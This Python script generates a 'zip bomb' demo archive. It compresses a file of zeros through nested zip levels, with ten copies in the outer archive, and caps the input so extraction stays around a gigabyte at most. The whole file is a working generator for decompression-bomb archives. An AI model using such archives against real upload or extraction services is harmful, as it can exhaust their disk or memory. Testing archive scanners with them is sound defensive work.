#!/usr/bin/env python3
"""
ZipZap - Zip Bomb Demo Script
A simple demonstration script that creates a zip bomb.
When extracted, the content equals approximately 100 MB.
For educational and research purposes only.
"""

import os
import zipfile
import argparse
from pathlib import Path
import sys
import tempfile
import shutil


def create_test_file(filename, size_mb):
    """Creates a test file with the specified size (in MB)"""
    try:
        size_bytes = size_mb * 1024 * 1024
        with open(filename, 'wb') as f:
            # Write in chunks to avoid memory issues with large files
            chunk_size = min(10 * 1024 * 1024, size_bytes)  # 10MB chunks or smaller
            remaining = size_bytes

            while remaining > 0:
                write_size = min(chunk_size, remaining)
                f.write(b'0' * write_size)
                remaining -= write_size

        print(f"File '{filename}' created with {size_mb} MB")
        return True
    except Exception as e:
        print(f"Error creating file '{filename}': {e}", file=sys.stderr)
        return False


def validate_zip_file(zip_path):
    """Validates that a zip file is correctly formatted and can be opened"""
    try:
        with zipfile.ZipFile(zip_path, 'r') as zipf:
            # Test the integrity of the entire archive
            result = zipf.testzip()
            if result is not None:
                print(f"Zip file has errors. First bad file: {result}", file=sys.stderr)
                return False
        return True
    except zipfile.BadZipFile:
        print(f"File is not a valid zip file: {zip_path}", file=sys.stderr)
        return False
    except Exception as e:
        print(f"Error validating zip file '{zip_path}': {e}", file=sys.stderr)
        return False


def create_nested_zip(output_dir, levels, file_size_mb, compression=zipfile.ZIP_DEFLATED):
    """Creates a nested zip file with multiple levels"""
    try:
        # Ensure that the output directory exists
        os.makedirs(output_dir, exist_ok=True)

        # Use a temporary directory for intermediate files
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create the original file in the temp directory
            original_file = os.path.join(temp_dir, "original.dat")
            if not create_test_file(original_file, file_size_mb):
                return None

            # Schrittweise Komprimierung
            current_file = original_file

            for level in range(levels):
                # Create intermediate zip files in the temp directory
                zip_filename = os.path.join(temp_dir, f"level_{level}.zip")

                try:
                    with zipfile.ZipFile(zip_filename, 'w', compression=compression) as zipf:
                        # Bei letzter Ebene mehrere Kopien hinzufügen
                        if level == levels - 1:
                            for i in range(10):  # 10 Kopien der Datei in der äußersten Zip
                                zipf.write(current_file, f"file_{i}.dat")
                        else:
                            zipf.write(current_file, os.path.basename(current_file))
                except Exception as e:
                    print(f"Error creating zip file '{zip_filename}': {e}", file=sys.stderr)
                    return None

                # Aufräumen, außer bei der ersten Datei (für Vergleichszwecke behalten)
                if level > 0 or levels == 1:
                    try:
                        os.remove(current_file)
                    except Exception as e:
                        print(f"Warning: Could not remove temporary file {current_file}: {e}")

                current_file = zip_filename
                print(f"Level {level} created: {zip_filename}")

                # Validate the zip file we just created
                if not validate_zip_file(zip_filename):
                    print(f"Created zip file is not valid: {zip_filename}", file=sys.stderr)
                    return None

            # Copy the final file to the output directory
            final_zip_name = f"zipzap_bomb_{file_size_mb}MB_{levels}levels.zip"
            final_zip_path = os.path.join(output_dir, final_zip_name)

            try:
                shutil.copy2(current_file, final_zip_path)
            except Exception as e:
                print(f"Error copying final zip to output directory: {e}", file=sys.stderr)
                return None

            # Final validation of the output file
            if not validate_zip_file(final_zip_path):
                print(f"Final zip file is not valid: {final_zip_path}", file=sys.stderr)
                return None

            # Größeninformationen anzeigen
            final_size = os.path.getsize(final_zip_path)
            uncompressed_size = file_size_mb * 1024 * 1024

            # Calculate total uncompressed size
            if levels == 1:
                total_uncompressed = uncompressed_size * 10  # 10 copies
            else:
                # Multiply by 10 copies at the last level
                total_uncompressed = uncompressed_size * 10

            print("\nZip Bomb Demo created:")
            print(f"Compressed size: {final_size / 1024 / 1024:.2f} MB")
            print(f"Extracted size (estimated): {total_uncompressed / 1024 / 1024:.2f} MB")
            if final_size > 0:  # Avoid division by zero
                print(f"Compression ratio: {total_uncompressed / final_size:.2f}:1")

            return final_zip_path
    except Exception as e:
        print(f"Unexpected error during zip creation: {e}", file=sys.stderr)
        return None


def main():
    parser = argparse.ArgumentParser(description="Creates a Zip Bomb Demo")
    parser.add_argument("--output", "-o", default="zipzap_output",
                        help="Output directory (default: zipzap_output)")
    parser.add_argument("--size", "-s", type=int, default=10,
                        help="Size of the original file in MB (default: 10)")
    parser.add_argument("--levels", "-l", type=int, default=1,
                        help="Number of nesting levels (default: 1)")
    parser.add_argument("--force", "-f", action="store_true",
                        help="Force overwrite without confirmation")

    args = parser.parse_args()

    if args.size <= 0 or args.size > 100:
        print("Error: Size must be between 1 and 100 MB", file=sys.stderr)
        return 1

    if args.levels <= 0 or args.levels > 5:
        print("Error: Levels must be between 1 and 5", file=sys.stderr)
        return 1

    print("Creating Zip Bomb Demo...")
    print(f"Base size: {args.size} MB, Levels: {args.levels}")

    # Create path to output directory
    output_dir = Path(args.output)

    # Ensure the output directory exists
    output_dir.mkdir(parents=True, exist_ok=True)

    # Display warning if directory exists and not forced
    if not args.force and output_dir.exists() and any(output_dir.iterdir()):
        print(f"Warning: Directory '{output_dir}' is not empty.")
        confirm = input("Continue? (y/n): ")
        if confirm.lower() not in ["y", "yes"]:
            print("Aborted.")
            return 1

    # Create demo
    final_zip = create_nested_zip(str(output_dir), args.levels, args.size)

    if final_zip:
        print(f"\nSuccess! The Zip Bomb Demo has been created: {final_zip}")
        print("NOTE: This script is for demonstration and educational purposes only.")
        return 0
    else:
        print("\nFailed to create zip bomb. See error messages above.", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())